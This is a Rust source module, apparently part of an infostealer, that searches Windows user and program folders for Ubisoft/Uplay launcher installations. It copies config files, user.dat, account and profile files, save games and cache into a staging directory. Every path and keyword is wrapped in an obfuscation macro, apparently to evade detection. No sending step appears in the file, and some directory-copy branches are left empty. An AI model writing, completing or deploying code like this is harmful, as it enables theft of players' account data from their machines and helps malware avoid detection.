use crate::sprotect;
use std::path::PathBuf;
use std::fs;

pub async fn extract() -> Result<(), Box<dyn std::error::Error>> {
    let output_dir = sprotect!("C:\\temp\\extract\\Games\\Uplay");
    std::fs::create_dir_all(&output_dir)?;

    let uplay_paths = detect_uplay_paths().await;
    
    for uplay_path in uplay_paths {
        extract_uplay_data(&uplay_path, &output_dir).await.ok();
    }

    Ok(())
}

async fn detect_uplay_paths() -> Vec<PathBuf> {
    let mut paths = Vec::new();
    
    let userprofile = std::env::var(sprotect!("USERPROFILE")).unwrap_or_default();
    let programdata = std::env::var(sprotect!("PROGRAMDATA")).unwrap_or_default();
    
    let uplay_locations = vec![
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Ubisoft Game Launcher")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Ubisoft Game Launcher")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Local\\Uplay")),
        format!("{}{}", userprofile, sprotect!("\\AppData\\Roaming\\Uplay")),
        format!("{}{}", programdata, sprotect!("\\Ubisoft")),
        sprotect!("C:\\Program Files\\Ubisoft"),
        sprotect!("C:\\Program Files (x86)\\Ubisoft"),
        sprotect!("C:\\Program Files\\Uplay"),
        sprotect!("C:\\Program Files (x86)\\Uplay"),
    ];

    for path_str in uplay_locations {
        let path = PathBuf::from(path_str);
        if path.exists() {
            paths.push(path);
        }
    }

    paths
}

async fn extract_uplay_data(uplay_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    extract_uplay_launcher_data(uplay_path, output_dir).await?;
    extract_uplay_config_files(uplay_path, output_dir).await?;
    extract_uplay_cache(uplay_path, output_dir).await?;
    Ok(())
}

async fn extract_uplay_launcher_data(uplay_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let launcher_dirs = vec![
        sprotect!("cache"),
        sprotect!("data"),
        sprotect!("logs"),
        sprotect!("settings"),
        sprotect!("config"),
    ];

    for dir_name in launcher_dirs {
        let dir_path = uplay_path.join(&dir_name);
        if dir_path.exists() {
            let dest_dir = format!("{}\\{}", output_dir, dir_name);
            copy_uplay_directory(&dir_path, &dest_dir).await?;
        }
    }

    Ok(())
}

async fn extract_uplay_config_files(uplay_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let config_files = vec![
        sprotect!("settings.yml"),
        sprotect!("user.dat"),
        sprotect!("configurations"),
        sprotect!("7\\remote\\save_files"),
        sprotect!("savegames"),
    ];

    scan_for_uplay_files(uplay_path, &config_files, output_dir).await?;
    Ok(())
}

async fn extract_uplay_cache(uplay_path: &PathBuf, output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    let cache_dirs = vec![
        sprotect!("cache\\avatars"),
        sprotect!("cache\\thumbnails"),
        sprotect!("cache\\configuration"),
    ];

    for cache_dir in cache_dirs {
        let cache_path = uplay_path.join(&cache_dir);
        if cache_path.exists() {
            let dest_dir = format!("{}\\{}", output_dir, cache_dir.replace("\\", "_"));
            copy_uplay_directory(&cache_path, &dest_dir).await?;
        }
    }

    Ok(())
}

async fn copy_uplay_directory(src_dir: &PathBuf, dest_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    std::fs::create_dir_all(dest_dir)?;

    if let Ok(entries) = fs::read_dir(src_dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_uplay_important_file(&file_name) {
                    let dest_path = format!("{}\\{}", dest_dir, file_name);
                    fs::copy(&path, dest_path).ok();
                }
            } else if path.is_dir() {
                let dir_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                if is_uplay_important_dir(&dir_name) {
                    let new_dest = format!("{}\\{}", dest_dir, dir_name);
                    
                }
            }
        }
    }
    Ok(())
}

async fn scan_for_uplay_files(dir: &PathBuf, target_files: &[String], output_dir: &str) -> Result<(), Box<dyn std::error::Error>> {
    if let Ok(entries) = fs::read_dir(dir) {
        for entry in entries.flatten() {
            let path = entry.path();
            
            if path.is_file() {
                let file_name = path.file_name().and_then(|n| n.to_str()).unwrap_or("").to_string();
                for target_file in target_files {
                    if file_name.contains(target_file) {
                        let dest_path = format!("{}\\{}", output_dir, file_name.replace("\\", "_"));
                        fs::copy(&path, dest_path).ok();
                    }
                }
            } else if path.is_dir() {
                
            }
        }
    }
    Ok(())
}

fn is_uplay_important_file(filename: &str) -> bool {
    let filename_lower = filename.to_lowercase();
    let important_extensions = [sprotect!(".yml"), sprotect!(".yaml"), sprotect!(".json"), sprotect!(".cfg"), sprotect!(".dat"), sprotect!(".log"), sprotect!(".txt"), sprotect!(".ini")];
    let important_keywords = [sprotect!("config"), sprotect!("setting"), sprotect!("user"), sprotect!("account"), sprotect!("save"), sprotect!("profile")];
    
    important_extensions.iter().any(|ext| filename_lower.ends_with(ext)) ||
    important_keywords.iter().any(|keyword| filename_lower.contains(keyword))
}

fn is_uplay_important_dir(dirname: &str) -> bool {
    let dirname_lower = dirname.to_lowercase();
    let important_dirs = [sprotect!("config"), sprotect!("save"), sprotect!("data"), sprotect!("log"), sprotect!("setting"), sprotect!("user")];
    
    important_dirs.iter().any(|dir| dirname_lower.contains(dir))
}